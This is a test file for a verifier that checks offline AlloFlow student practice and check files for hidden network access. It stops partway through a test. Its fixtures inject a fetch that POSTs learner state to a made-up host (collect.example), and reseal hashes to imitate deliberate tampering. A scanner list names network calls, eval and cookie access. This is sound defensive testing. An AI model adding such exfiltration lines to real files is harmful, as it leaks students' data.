import { beforeAll, describe, expect, it } from 'vitest';
import { existsSync, readFileSync, readdirSync, statSync } from 'node:fs';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';
import { TextDecoder, TextEncoder } from 'node:util';
import { runInNewContext } from 'node:vm';
import { JSDOM } from 'jsdom';

// "Check a file" (packets-verify.html) and the guide for school IT (packets-it.html).
// Part 1 runs the checks (packets_verify_core.js) on files made by the real builders: a practice file, a check,
// a check with a teacher code, a practice file with a class mailbox, and an older file with no manifest.
// Part 2 changes those files the way a careless or a deliberate person might, and expects the result to change.
// Part 3 gives the checks hostile and wrong files. Part 4 reads the new files as text. Part 5 runs the page in jsdom.
const require = createRequire(import.meta.url);
const verify = require('../packets_verify_core.js');
const checks = require('../packet_check_builder.js');
const tool = require('../dev-tools/make_word_sounds_packet.cjs');
const { dictionary, core, loader, wordlist, builder } = tool.loadParts();
const read = (file) => readFileSync(file, 'utf8');

const NAME = 'AlloFlow Packets';
const PAGE = 'packets-verify.html';
const GUIDE = 'packets-it.html';
const CORE = 'packets_verify_core.js';
const SCRIPT = 'packets-verify.js';
const STYLES = 'packets-verify.css';
const SAMPLE_FILES = ['packets_samples/sample_practice.js', 'packets_samples/sample_check.js', 'packets_samples/sample_changed.js'];
const WRITTEN = [PAGE, GUIDE, CORE, SCRIPT, STYLES];
const CSP = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'none'; form-action 'none'; base-uri 'none'";
const PROOF_LINE = 'This page runs without AI. No account. The file you choose is read in this browser and is not uploaded.';
const LIMITS = "This page reads the file's text in your browser. It does not run the file and does not upload it. It reports what the file declares and what its code contains. "
  + 'It cannot prove that software is free of mistakes; the file is one readable script, and your IT staff can read it.';
const FERPA = "Whether this meets your district's obligations under FERPA or state law is your district's decision; this page gives you the facts to make it.";
// The three headlines, word for word. There is no fourth.
const CLOSED = 'This file declares that it cannot connect to the internet, and nothing in its code says otherwise.';
const ONE_PLACE = 'This file can send results to one place: script.google.com. Nothing else in its code connects anywhere.';
const look = (n) => 'This file needs a person to look: ' + (n === 1 ? '1 thing was' : n + ' things were') + ' not expected.';
const [EXPECTED, UNEXPECTED, LOOK] = ['expected in this kind of file', 'not expected', 'needs a person to look'];
const PARTS = ['What this file says about itself', 'What its code can reach', 'What it keeps on the device', 'What it saves', 'Things a person should look at', 'For IT staff'];
const REPOSITORY = 'https://github.com/Apomera/AlloFlow';
// British spellings and usages that must not reach a US reader (the list the other Packets page tests use).
const BRITISH = /practis|standardis|licence|colour|\bmarking\b|\bmarked\b|\btick(?:ed|s)?\b|USB stick|\bwhilst\b|\bmaths\b|favour|behaviour|\bcentre\b/i;
// Words that would turn a description into a promise.
const PROMISES = /\b(?:safe|safely|safety|safer|unsafe|secure|securely|security|insecure|guarantee[ds]?|certif\w*|compliant|compliance|tamper-?proof|trusted|bulletproof)\b/i;

// ---------------------------------------------------------------------------
// Fixtures: real files, made by the real builders
// ---------------------------------------------------------------------------
// Every recording is a few samples of near silence, different for each sound, so the files stay small.
const quiet = (key) => {
  let h = 2166136261 >>> 0;
  for (let i = 0; i < key.length; i++) { h ^= key.charCodeAt(i); h = Math.imul(h, 16777619) >>> 0; }
  const pcm = Buffer.alloc(8);
  for (let i = 0; i < 4; i++) pcm.writeInt16LE(((h >>> (i * 4)) & 7) - 3, i * 2);
  return builder.pcmToWavUri(pcm.toString('base64'), 22050);
};
const anySound = (name) => new Proxy({}, {
  get: (target, key) => (typeof key === 'string' ? quiet(name + '|' + key) : undefined),
  has: () => true,
  getOwnPropertyDescriptor: (target, key) => (typeof key === 'string' ? { value: quiet(name + '|' + key), configurable: true, enumerable: true, writable: true } : undefined),
});
const QUIET_BANKS = { phonemes: anySound('phonemes'), isolation: anySound('isolation'), instructions: anySound('instructions'), words: anySound('words'), kokoroWords: {}, gapFill: {} };
const practiceFile = async (over = {}) => (await builder.buildPacket({ words: ['cat', 'sun', 'map', 'dog'], activities: ['isolation', 'blending'], title: 'Short vowels', seed: 7, core, dictionary,
  banks: QUIET_BANKS, loader, wordlist, ...over })).html;
const BANK = JSON.parse(read('psychometric_math_probes.json'));
const checkFile = (over = {}) => checks.buildCheckPacket({ lesson: checks.lessonFromMathProblems({ title: 'Facts to 20', problems: checks.parseProblems('7+8,12-5,6x4,20/4,9+6,15-7'), timeLimitS: 120 }), loader, ...over }).html;
// A practice file with a class mailbox, made the way tests/word_sounds_take_home_packet.test.js makes one. The mailbox is made up.
const wav = (tag) => { const b = Buffer.alloc(64); b.write('RIFF'); b.write('WAVE', 8); b.write(String(tag).slice(0, 8), 44); return b.toString('base64'); };
const uri = (tag) => 'data:audio/wav;base64,' + wav(tag);
const SMALL_BANKS = { isolation: { '1st': uri('q1'), '2nd': uri('q2'), '3rd': uri('q3') }, phonemes: { k: uri('k'), a: uri('a'), t: uri('t'), m: uri('m'), p: uri('p'), s: uri('s') },
  instructions: { fb_great_job: uri('gj'), fb_try_again_listen: uri('ta') } };
const word = (w, position, correct, options) => ({ word: w, targetWord: w, term: w, _ttsAssets: { [w]: { mime: 'audio/wav', base64: wav(w) } }, activityItems: { isolation: { position, correctSound: correct, options } } });
const MAILBOX = { url: 'https://script.google.com/macros/s/AKfycbTEST/exec', packId: 'PK-12345678-1234-4234-9234-123456789abc', secret: 'kSECRETk9431', expiresAt: '2099-01-01T00:00:00.000Z' };
const mailboxFile = () => loader.buildHtml(loader.lessonFromPack([word('cat', 0, 'k', ['k', 'a', 't', 'm']), word('map', 2, 'p', ['m', 'a', 'p', 's'])],
  { core, banks: SMALL_BANKS, title: 'Short a', lessonId: 'L-mailbox-1', submit: MAILBOX }).lesson, { core });
// An older practice file, made on 2026-11-11 by the loader as it was before files carried a manifest. Its recordings were left out.
const OLDER = read('tests/fixtures/packets_verify/older-practice-file.html');

const F = {};
beforeAll(async () => {
  F.practice = await practiceFile();
  F.check = checkFile();
  F.coded = checks.buildCheckPacket({ lesson: checks.lessonFromMathForm({ bank: BANK, measure: 'math_computation', grade: '3', form: 'A' }), loader, teacherCode: 'tulip-47' }).html;
  F.mailbox = mailboxFile();
  F.older = OLDER;
});

const cspOf = (html) => /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(html)[1];
const scriptOf = (html) => /<script>([\s\S]*?)<\/script>/.exec(html)[1];
const manifestOf = (html) => JSON.parse(/<script type="application\/json" id="packet-manifest">(.*?)<\/script>/.exec(html)[1]);
const lessonOf = (html) => JSON.parse(/var lesson=(.*);\nvar labels=/.exec(html)[1]);
const sha = (text, form = 'hex') => createHash('sha256').update(text, 'utf8').digest(form);
// What a person who changes a file on purpose would do next: work the hash out again and write it in both places.
const reseal = (html) => html.replace(/'sha256-[A-Za-z0-9+/=]+'/g, "'sha256-" + sha(scriptOf(html), 'base64') + "'").replace(/"scriptSha256":"[0-9a-f]*"/, '"scriptSha256":"' + sha(scriptOf(html)) + '"');
// One line of code, written into the script of a file.
const withCode = (html, code) => { const out = html.replace('\nvar renders=', '\n' + code + '\nvar renders='); expect(out).not.toBe(html); return out; };
const changed = (html, from, to) => { const out = html.split(from).join(to); expect(out, 'nothing was changed: ' + from).not.toBe(html); return out; };
// The first words of the data block of every file: a change written after them is a change to the data and to nothing else.
const DATA = '"schema":"alloflow-take-home-lesson/v2"';
const odd = (report) => report.findings.filter((f) => f.cls !== EXPECTED);
const ids = (report) => odd(report).map((f) => f.id).sort();
const verdicts = (report) => Object.fromEntries(report.claims.map((row) => [row.id, row.verdict]));

// ---------------------------------------------------------------------------
// Part 1: real files
// ---------------------------------------------------------------------------
describe('the checks: SHA-256', () => {
  it('gives the value node gives, for every length around a block edge', () => {
    for (const n of [0, 1, 3, 55, 56, 57, 63, 64, 65, 119, 120, 127, 128, 1000, 100003]) {
      const bytes = new Uint8Array(n);
      for (let i = 0; i < n; i++) bytes[i] = (i * 31 + n) & 255;
      const want = createHash('sha256').update(bytes).digest();
      expect(verify.sha256(bytes), 'length ' + n).toEqual({ hex: want.toString('hex'), base64: want.toString('base64') });
    }
    // A view into the middle of a larger buffer is hashed as the view, not as the buffer.
    const big = new Uint8Array(300).map((v, i) => i & 255);
    expect(verify.sha256(big.subarray(100, 230)).hex).toBe(createHash('sha256').update(big.subarray(100, 230)).digest('hex'));
  });
});

describe('the checks: a practice file', () => {
  it('reports the first headline, and its three script hashes agree', () => {
    const r = verify.verifyPacket(F.practice);
    expect([r.ok, r.refused, r.kind, r.result, r.headline]).toEqual([true, '', 'packet', 'closed', CLOSED]);
    expect(r.kindLine).toBe('This file declares itself an AlloFlow practice file (file type alloflow-packet/1).');
    const hex = sha(scriptOf(F.practice));
    expect([r.script.count, r.script.sha256, r.script.inPolicy, r.script.inManifest, r.script.verdict]).toEqual([1, hex, hex, hex, 'agree']);
    expect(r.script.base64).toBe(sha(scriptOf(F.practice), 'base64'));
    expect(cspOf(F.practice)).toContain("script-src 'sha256-" + r.script.base64 + "'");
    expect(r.script.note).toBe('The script, the hash in the policy and the hash in the manifest are the same.');
    expect(r.script.lineEnds).toBe('LF');
    expect(odd(r)).toEqual([]);
    expect(r.counts).toMatchObject({ notExpected: 0, look: 0, pictures: 0, bytes: Buffer.byteLength(F.practice) });
    expect(r.counts.sounds).toBe(Object.keys(lessonOf(F.practice).audio).length);
    expect(r.counts.sounds).toBeGreaterThan(8);
  });

  it('reads what the file is from its manifest, and shows it as short plain strings', () => {
    const r = verify.verifyPacket(F.practice);
    const m = manifestOf(F.practice);
    expect(r.manifest).toEqual({ found: true, readable: true, error: '' });
    expect(r.identity).toEqual({ engine: 'alloflow-packet/1', player: m.player, title: 'Short vowels', packetId: m.packet.id, packetVersion: m.packet.version, form: '', mode: 'practice', what: m.what, license: 'AGPL-3.0',
      builder: { name: m.builder.name, seed: '7', ai: 'none', words: '4', items: String(m.builder.items) } });
    expect(r.check).toBeNull();
    expect(r.data).toMatchObject({ id: m.packet.id, version: m.packet.version, mode: 'practice', storageName: m.stores[0].key, mailboxAddress: '', teacherCode: false, scrambled: null });
    expect(r.plain.about).toContain('Made by ' + m.builder.name + ', which says it runs without AI (4 words, ' + m.builder.items + ' items).');
    expect(r.plain.about[r.plain.about.length - 1]).toBe('Inside the file: ' + r.counts.sounds + ' recorded sounds and 0 pictures. Size: ' + r.sizeText + '.');
  });

  it('reads the policy into plain statements, each with the part of the policy that says so', () => {
    const r = verify.verifyPacket(F.practice);
    expect(r.policy.found && r.policy.count).toBe(1);
    expect(r.policy.text).toBe(cspOf(F.practice));
    expect(r.policy.directives.map((row) => row.name)).toEqual(['default-src', 'script-src', 'style-src', 'media-src', 'img-src', 'form-action', 'base-uri', 'object-src', 'frame-src', 'worker-src', 'manifest-src', 'connect-src']);
    const facts = Object.fromEntries(r.policy.facts.map((row) => [row.id, row]));
    expect(Object.keys(facts)).toEqual(['connect', 'scripts', 'styles', 'pictures', 'sounds', 'fonts', 'frames', 'plugins', 'workers', 'pinned', 'forms', 'base']);
    expect(r.policy.facts.every((row) => row.open === false)).toBe(true);
    expect([facts.connect.answer, facts.connect.basis]).toEqual(['No. The policy refuses every connection.', "connect-src 'none'"]);
    expect(facts.scripts.answer).toBe('No. Only a script inside the file can run, and only while it matches the hash in the policy.');
    expect([facts.pictures.answer, facts.pictures.basis]).toEqual(['No. Only pictures stored inside the file.', 'img-src data:']);
    expect([facts.sounds.answer, facts.sounds.basis]).toEqual(['No. Only sounds stored inside the file.', 'media-src data: blob:']);
    // Fonts are named nowhere in the policy: the line a browser falls back to is the one shown.
    expect([facts.fonts.answer, facts.fonts.basis]).toEqual(['No.', "default-src 'none'"]);
    expect(facts.pinned.answer).toBe('Yes. The browser runs the script only while it matches sha256-' + r.script.base64 + '.');
    expect([facts.forms.answer, facts.base.answer]).toEqual(['No. The policy blocks forms.', 'No. The policy blocks base changes.']);
  });

  it('sets each thing the file says beside what its code shows', () => {
    const r = verify.verifyPacket(F.practice);
    expect(verdicts(r)).toEqual({ identity: 'agree', policy: 'agree', script: 'agree', stores: 'agree', saves: 'agree', network: 'agree', 'never-internet': 'agree', 'never-microphone': 'agree',
      'never-camera': 'agree', 'never-cookies': 'agree', 'never-ai': 'agree', license: 'cannot tell', credits: 'cannot tell' });
    const row = (id) => r.claims.find((c) => c.id === id);
    const m = manifestOf(F.practice);
    expect(row('stores').says).toBe('it keeps 1 item in localStorage, named ' + m.stores[0].key + '.');
    expect(row('stores').shows).toBe("The code uses the browser's storage in 3 places, each under that one name. The scan found no cookies and no other storage.");
    expect(row('saves').says).toBe('it can save 2 files: ' + m.saves[0].file + ' (alloflow-packet-result/1) and ' + m.saves[1].file + ' (alloflow-take-home-result schemaVersion 3).');
    expect(row('network').shows).toBe('The policy refuses every connection, and the scan found no call that makes one.');
    // What a scan cannot show is said to be so.
    expect(row('never-ai').shows).toMatch(/A scan cannot show more than that\.$/);
    expect(row('license').shows).toBe('A license is a statement about rights. Code cannot show it.');
    expect(r.storage).toEqual({ places: 3, name: m.stores[0].key, clean: true, stated: true });
  });

  it('lists what the scan found, with a line, a character and a short piece of the file', () => {
    const r = verify.verifyPacket(F.practice);
    expect([...new Set(r.findings.map((f) => f.id))].sort()).toEqual(['clipboard', 'file-save', 'local-storage']);
    expect(r.findings.every((f) => f.cls === EXPECTED && f.why.length > 20 && f.excerpt.length > 10 && f.excerpt.length < 260)).toBe(true);
    const lines = F.practice.split('\n');
    for (const f of r.findings) {
      const token = f.id === 'local-storage' ? 'localStorage' : f.id === 'clipboard' ? 'clipboard' : /^(?:createObjectURL|new )/;
      const at = lines[f.line - 1].slice(f.col - 1, f.col + 20);
      expect(typeof token === 'string' ? at.startsWith(token) : token.test(at), f.id + ' at ' + f.line + ':' + f.col + ' = ' + at).toBe(true);
    }
    expect(r.findings.filter((f) => f.id === 'local-storage').map((f) => f.where)).toEqual(['the manifest block', 'the code', 'the code', 'the code']);
    expect(r.counts.expected).toBe(r.findings.length);
  });

  it('gives the same result for the bytes of the file as for its text, and a fingerprint of the file as it is on disk', () => {
    const bytes = Buffer.from(F.practice, 'utf8');
    const fromBytes = verify.verifyPacket(new Uint8Array(bytes)), fromText = verify.verifyPacket(F.practice), fromBuffer = verify.verifyPacket(new Uint8Array(bytes).buffer);
    expect(fromBytes.fingerprint).toEqual({ sha256: createHash('sha256').update(bytes).digest('hex'), of: 'the file as it is on disk' });
    expect(fromText.fingerprint).toEqual({ sha256: fromBytes.fingerprint.sha256, of: 'the text of the file' });
    expect({ ...fromBytes, fingerprint: null }).toEqual({ ...fromText, fingerprint: null });
    expect(fromBuffer).toEqual(fromBytes);
    // A file saved with a byte-order mark still reads; its fingerprint is of the bytes as they are.
    const marked = Buffer.concat([Buffer.from([0xEF, 0xBB, 0xBF]), bytes]);
    const withMark = verify.verifyPacket(new Uint8Array(marked));
    expect([withMark.headline, withMark.script.verdict]).toEqual([CLOSED, 'agree']);
    expect(withMark.fingerprint.sha256).toBe(createHash('sha256').update(marked).digest('hex'));
  });

  it('a copy saved with Windows line ends still agrees, as it does in a browser', () => {
    const r = verify.verifyPacket(changed(F.practice, '\n', '\r\n'));
    expect([r.headline, r.script.verdict, r.script.sha256]).toEqual([CLOSED, 'agree', sha(scriptOf(F.practice))]);
    expect(r.script.lineEnds).toBe('CRLF or CR (read as LF, as a browser does)');
    expect(r.fingerprint.sha256).not.toBe(verify.verifyPacket(F.practice).fingerprint.sha256);
    expect(r.script.codeSha256).toBe(verify.verifyPacket(F.practice).script.codeSha256);
  });

  it('two files with the same activities share one code hash, whatever their words', async () => {
    const one = verify.verifyPacket(F.practice);
    const two = verify.verifyPacket(await practiceFile({ words: ['pig', 'bed', 'hat'], title: 'Other words', seed: 3 }));
    const three = verify.verifyPacket(await practiceFile({ activities: ['isolation'] }));
    expect(one.script.codeSha256).toMatch(/^[0-9a-f]{64}$/);
    expect(two.script.codeSha256).toBe(one.script.codeSha256);
    expect(two.script.sha256).not.toBe(one.script.sha256);
    expect(three.script.codeSha256).not.toBe(one.script.codeSha256);
    expect([two.headline, three.headline]).toEqual([CLOSED, CLOSED]);
  });
});

describe('the checks: a check', () => {
  it('reports the first headline and says it is a check', () => {
    const r = verify.verifyPacket(F.check);
    expect([r.kind, r.result, r.headline, r.script.verdict]).toEqual(['packet', 'closed', CLOSED, 'agree']);
    expect(r.kindLine).toBe('This file declares itself an AlloFlow check (file type alloflow-packet/1).');
    expect([r.identity.mode, r.identity.title, r.identity.form, r.identity.builder]).toEqual(['check', 'Facts to 20', 'custom', null]);
    expect(r.check).toMatchObject({ measure: 'math_dcpm', timeLimitS: 120, items: '6', practiceItems: '0', teacherCode: 'none' });
    expect(r.check.answers).toBe('scrambled (XOR with a SHA-256 keystream); this stops casual looking, not a determined person');
    expect(r.data).toMatchObject({ mode: 'check', teacherCode: false, scrambled: true, timeLimitS: 120, items: 6 });
    expect(verdicts(r)).toMatchObject({ identity: 'agree', stores: 'agree', saves: 'agree', network: 'agree', 'teacher-code': 'agree', answers: 'agree' });
    expect(odd(r)).toEqual([]);
    expect([r.counts.sounds, r.counts.pictures]).toEqual([0, 0]);
    expect(r.plain.about).toContain('It says it holds 6 items, with a time limit of 120 seconds.');
    expect(r.plain.about).toContain('A teacher code: none. The data block agrees.');
  });

  it('with a teacher code: says a code is set, finds the lock in the data, and never shows the code', () => {
    const r = verify.verifyPacket(F.coded);
    expect([r.headline, r.script.verdict]).toEqual([CLOSED, 'agree']);
    expect(r.check.teacherCode).toMatch(/^set; kept only as a salted SHA-256 hash \(\d+ rounds\); it locks the review screen and is not encryption$/);
    expect(r.data.teacherCode && r.data.scrambled).toBe(true);
    expect(verdicts(r)).toMatchObject({ 'teacher-code': 'agree', answers: 'agree' });
    expect(r.claims.find((row) => row.id === 'teacher-code').shows).toBe("The data block holds a lock for the teacher's screen (a salted hash, not the code itself).");
    expect(JSON.stringify(r) + verify.reportText(r, {})).not.toContain('tulip-47');
  });

  it('two checks with different problems share one code hash', () => {
    const other = verify.verifyPacket(checks.buildCheckPacket({ lesson: checks.lessonFromMathProblems({ title: 'Other', problems: checks.parseProblems('1+1,2+2,3+3'), timeLimitS: 60 }), loader }).html);
    expect(other.script.codeSha256).toBe(verify.verifyPacket(F.check).script.codeSha256);
    expect(other.script.sha256).not.toBe(verify.verifyPacket(F.check).script.sha256);
  });
});

describe('the checks: a practice file with a class mailbox', () => {
  it('reports the second headline, with the one place by name', () => {
    const r = verify.verifyPacket(F.mailbox);
    expect([r.kind, r.result, r.headline, r.script.verdict]).toEqual(['packet', 'mailbox', ONE_PLACE, 'agree']);
    expect(r.mailbox).toEqual({ declared: true, host: 'script.google.com', address: MAILBOX.url });
    expect(odd(r)).toEqual([]);
    const connect = r.policy.facts.find((row) => row.id === 'connect');
    expect([connect.answer, connect.open]).toEqual(['Only to: https://script.google.com, https://script.googleusercontent.com.', true]);
    expect(verdicts(r)).toMatchObject({ network: 'agree', 'network-when': 'cannot tell', 'never-ai': 'cannot tell', 'never-cookies': 'agree' });
    expect(verdicts(r)['never-internet']).toBeUndefined();
    expect(r.claims.find((row) => row.id === 'network').says).toBe('it sends to script.google.com: the results, to the class mailbox of the teacher, only when the learner presses Send.');
  });

  it('the one call that sends and the mailbox addresses are expected; the mailbox key is never shown', () => {
    const r = verify.verifyPacket(F.mailbox);
    const sends = r.findings.filter((f) => f.id === 'fetch');
    expect(sends.map((f) => [f.cls, f.where, f.why])).toEqual([[EXPECTED, 'the code', 'The class mailbox send. A file with a class mailbox has exactly one such call.']]);
    const addresses = r.findings.filter((f) => f.id === 'address');
    expect(addresses.map((f) => f.where)).toEqual(['the policy line', 'the policy line', 'the manifest block', 'the manifest block', 'the data block']);
    expect(addresses.every((f) => f.cls === EXPECTED)).toBe(true);
    expect(addresses[4].excerpt).toBe(MAILBOX.url);
    expect(r.plain.reach.slice(0, 2)).toEqual(['It can connect to one place: script.google.com, where a class mailbox (a Google Apps Script web app) receives results.',
      'The address in the file is ' + MAILBOX.url + '. Many web apps share script.google.com, so the teacher who made the file is the one who can confirm that this address is their class mailbox.']);
    expect(r.plain.saves.join(' ')).toContain('It can also send the results to the class mailbox. It says this happens only when the learner presses Send. A scan cannot tell when code runs.');
    const everything = JSON.stringify(r) + verify.reportText(r, { product: NAME, file: 'a.html', when: 'now' });
    expect(everything).not.toContain(MAILBOX.secret);
    expect(everything).not.toContain(MAILBOX.packId);
  });
});

describe('the checks: an older practice file, with no manifest', () => {
  it('says fewer checks apply, and asks a person to look at the mailbox code it carries', () => {
    const r = verify.verifyPacket(F.older);
    expect([r.kind, r.result, r.headline]).toEqual(['older', 'look', look(1)]);
    expect(r.kindLine).toBe('This looks like an older AlloFlow practice file: fewer checks apply.');
    expect(r.manifest).toEqual({ found: false, readable: false, error: '' });
    expect(r.claims).toEqual([]);
    expect([r.script.count, r.script.verdict, r.script.note]).toEqual([1, 'cannot tell', 'An older file: its policy and its manifest carry no hash to compare with.']);
    expect(r.script.sha256).toBe(sha(scriptOf(F.older)));
    expect(odd(r).map((f) => [f.id, f.cls, f.where])).toEqual([['fetch', LOOK, 'the code']]);
    expect(odd(r)[0].why).toBe("Older practice files carry the class mailbox code even when no mailbox is set. This file's policy refuses every connection, so the call cannot send anything. "
      + 'A file made again with the current maker does not carry this code.');
  });

  it('still reads its policy: no connection, but no pinned script and no block on forms', () => {
    const r = verify.verifyPacket(F.older);
    const facts = Object.fromEntries(r.policy.facts.map((row) => [row.id, row]));
    expect([facts.connect.answer, facts.connect.basis, facts.connect.open]).toEqual(['No. The policy refuses everything it does not name, and it names no place to connect to.', "default-src 'none'", false]);
    expect(facts.scripts.answer).toBe('No. But any script written inside the file can run: the policy does not pin the script by a hash.');
    expect([facts.pinned.open, facts.forms.open, facts.base.open]).toEqual([true, true, true]);
    expect(r.plain.about.slice(0, 2)).toEqual([r.kindLine, 'It has no manifest block, so it does not say what it stores, what it saves or what it connects to. Its policy and its code were still read.']);
    expect(r.plain.reach).toContain('Its script is not pinned by a hash. Older files were made this way.');
    expect(r.plain.reach).toContain('Its policy does not block forms and base addresses. The scan found none in the file.');
    expect(r.plain.keeps[0]).toBe("Its code uses the browser's storage (localStorage) in 3 places, under the name alloflow-take-home:ws-sample-1:" + r.data.version + '.');
  });
});

describe('the checks: no choice of activities trips the scan', () => {
  it('the code and the labels of every activity scan clean', () => {
    let scanned = 0;
    for (const set of [loader.ADAPTERS, loader.CHECK_ADAPTERS]) {
      for (const id of Object.keys(set)) {
        const source = String(set[id].render) + '\n' + String(set[id].score || '') + '\n' + JSON.stringify(set[id].labels || {});
        expect(verify.scanSource(source, { closed: true }).filter((f) => f.cls !== EXPECTED).map((f) => f.name + ': ' + f.excerpt), id).toEqual([]);
        scanned++;
      }
    }
    expect(scanned).toBeGreaterThanOrEqual(23);
    for (const labels of [loader.DEFAULT_LABELS, loader.CHECK_LABELS, loader.PICTURE_LABELS]) {
      if (labels) expect(verify.scanSource(JSON.stringify(labels), { closed: true }).filter((f) => f.cls !== EXPECTED)).toEqual([]);
    }
  });

  it('the scan fires on each thing it looks for, and stays quiet on words that only look alike', () => {
    const fires = ['see http://x.test', 'see HTTPS://x.test/a', 'a ws://x.test', 'src="//x.test/a.js"', "u = '//X.Example.org/p'", 'win.fetch(u)', 'new XMLHttpRequest()', 'new WebSocket(u)', 'new EventSource(u)', 'navigator.sendBeacon(u)',
      'new RTCPeerConnection()', 'eval(x)', 'new Function(x)', 'import(u)', 'importScripts(u)', 'new Worker(u)', 'location = u', 'win.location.href = u', 'location.replace(u)', 'location.assign(u)', 'window.open(u)',
      '<form action=x>', '<FORM>', '<iframe src=x>', '<object data=x>', '<embed src=x>', '<link rel=stylesheet href=x>', '<base href=x>', '<meta http-equiv="refresh" content="0">', "<meta http-equiv=refresh>",
      '<a href="javascript:x()">', 'document.cookie', 'navigator.mediaDevices.getUserMedia({})', 'new MediaRecorder(s)', 'speechSynthesis.speak(u)', 'navigator.serviceWorker', 'sessionStorage.x', 'indexedDB.open', 'caches.open(n)',
      'node.innerHTML = x', 'document.write(x)', 'data:text/html,<b>', 'localStorage.setItem("other", x)', 'navigator.clipboard.readText()'];
    for (const sample of fires) expect(verify.scanSource(sample, {}).filter((f) => f.cls !== EXPECTED).length, sample).toBeGreaterThan(0);
    const quiet = ['String(win.location.hash || "")', 'a.location === b', "el('a', { download: name })", 'the open door', 'reopen (x)', '// a note about it', 'a / b // c', 'ratio 3://4', 'he fetches it', 'the form is here',
      'win.localStorage.setItem(storageKey, JSON.stringify(state))', 'win.navigator.clipboard.writeText(tsv)', 'new win.Blob([body], { type: type })', 'win.URL.createObjectURL(blob)', 'data:audio/wav;base64,AAAA', 'important(', 'cookies'];
    for (const fine of quiet) expect(verify.scanSource(fine, {}).filter((f) => f.cls !== EXPECTED).map((f) => f.name), fine).toEqual([]);
  });
});

describe('the sample files of the page', () => {
  const box = {};
  for (const file of SAMPLE_FILES) new Function('window', read(file))(box);
  const samples = box.AlloPacketSamples;

  it('are a real practice file and a real check, small, with no recordings in them', () => {
    expect(Object.keys(samples)).toEqual(['practice', 'check', 'changed']);
    expect([samples.practice.name, samples.check.name]).toEqual(['sample-practice-file.html', 'sample-check-file.html']);
    const practice = verify.verifyPacket(samples.practice.text), check = verify.verifyPacket(samples.check.text);
    expect([practice.headline, practice.script.verdict, practice.identity.mode, practice.identity.title]).toEqual([CLOSED, 'agree', 'practice', 'Sample practice file']);
    expect([check.headline, check.script.verdict, check.identity.mode, check.identity.title]).toEqual([CLOSED, 'agree', 'check', 'Sample check']);
    expect(practice.identity.builder.name).toMatch(/^alloflow-packet-builder\//);
    // The files read back exactly as they were made: the hash in each policy was worked out by the loader that made it.
    expect(practice.script.sha256).toBe(manifestOf(samples.practice.text).scriptSha256);
    expect(check.script.sha256).toBe(manifestOf(samples.check.text).scriptSha256);
    // Every recording in the practice sample is 52 bytes: a header and four samples.
    const clips = Object.values(lessonOf(samples.practice.text).audio);
    expect(clips.length).toBe(practice.counts.sounds);
    expect(clips.every((clip) => Buffer.from(clip.split(',')[1], 'base64').length === 52)).toBe(true);
    expect(Object.keys(lessonOf(samples.check.text).audio)).toEqual([]);
    const total = SAMPLE_FILES.reduce((sum, file) => sum + statSync(file).size, 0);
    expect(total).toBeLessThan(150000);
  });

  it('the changed sample is the practice sample with one line added, and the page says what the line is', () => {
    const made = samples.changed();
    expect(made.name).toBe('sample-changed-file.html');
    const before = samples.practice.text.split('\n'), after = made.text.split('\n');
    expect(after.length).toBe(before.length + 1);
    const at = after.findIndex((line, i) => line !== before[i]);
    expect(after[at]).toBe("win.fetch('https://collect.example/results', { method: 'POST', body: JSON.stringify(state) });");
    expect(after.slice(0, at).concat(after.slice(at + 1))).toEqual(before);
    const r = verify.verifyPacket(made.text);
    expect([r.result, r.headline, r.script.verdict]).toEqual(['look', look(4), 'differs']);
    expect(ids(r)).toEqual(['address', 'claim-network', 'fetch', 'hash']);
    expect(r.script.note).toBe('The script matches neither the hash in the policy nor the hash in the manifest.');
  });

  it('hold no web address but the made-up one in the changed sample', () => {
    const found = SAMPLE_FILES.flatMap((file) => read(file).match(/(?:https?:|wss?:)?\/\/[a-z0-9.-]+\.[a-z]{2,}[^\s"'<>)]*/gi) || []);
    expect(found).toEqual(['https://collect.example/results']);
  });
});

// ---------------------------------------------------------------------------
// Part 2: a changed file changes the result
// ---------------------------------------------------------------------------
describe('a changed file: each change flips the result', () => {
  it('one character changed in the script: the hash no longer matches', () => {
    const r = verify.verifyPacket(changed(F.practice, '\nvar renders=', '\nvar renderz='));
    expect([r.result, r.headline, r.script.verdict]).toEqual(['look', look(1), 'differs']);
    expect(odd(r).map((f) => [f.id, f.cls])).toEqual([['hash', UNEXPECTED]]);
    expect(odd(r)[0].why).toBe('The script matches neither the hash in the policy nor the hash in the manifest. The script was changed after the file was made, or the file was not saved whole. A browser will refuse to run it.');
    expect(r.script.sha256).not.toBe(r.script.inPolicy);
    expect(r.script.inPolicy).toBe(r.script.inManifest);
    // A change to one word of the data is a change to the script too: the words are inside it.
    expect(verify.verifyPacket(changed(F.practice, DATA, DATA + ',"more":1')).script.verdict).toBe('differs');
  });

  it('connect-src widened: the policy, the address and what the file says about itself all show it', () => {
    const inPolicyOnly = verify.verifyPacket(F.practice.replace("connect-src 'none'\">", 'connect-src https://collect.example">'));
    expect(inPolicyOnly.headline).toBe(look(5));
    expect(ids(inPolicyOnly)).toEqual(['address', 'claim-network', 'claim-never-internet', 'claim-policy', 'policy-connect']);
    expect(inPolicyOnly.policy.facts[0]).toMatchObject({ id: 'connect', answer: 'Only to: https://collect.example.', open: true });
    // Written into the manifest's copy too, with the hashes still right: the file now agrees with itself and still shows.
    const everywhere = verify.verifyPacket(changed(F.practice, "connect-src 'none'", 'connect-src https://collect.example'));
    expect([everywhere.script.verdict, verdicts(everywhere).policy, everywhere.result]).toEqual(['agree', 'agree', 'look']);
    expect(ids(everywhere)).toEqual(['address', 'address', 'claim-network', 'claim-never-internet', 'policy-connect']);
    for (const wide of ['connect-src *', "connect-src 'self'", 'connect-src https:', 'connect-src data: wss://x.example']) {
      expect(ids(verify.verifyPacket(changed(F.practice, "connect-src 'none'", wide))), wide).toContain('policy-connect');
    }
    // The line taken away altogether still leaves default-src 'none': nothing is opened, but the manifest's copy differs.
    const dropped = verify.verifyPacket(F.practice.replace("; connect-src 'none'\">", '">'));
    expect(ids(dropped)).toEqual(['claim-policy']);
    expect(dropped.policy.facts[0].open).toBe(false);
  });

  it('a fetch( added: found by the scan, also when the person who added it made the hashes match again', () => {
    const line = 'win.fetch("collect", { method: "POST", body: JSON.stringify(lesson) });';
    const careless = verify.verifyPacket(withCode(F.practice, line));
    expect(ids(careless)).toEqual(['claim-network', 'fetch', 'hash']);
    const deliberate = verify.verifyPacket(reseal(withCode(F.practice, line)));
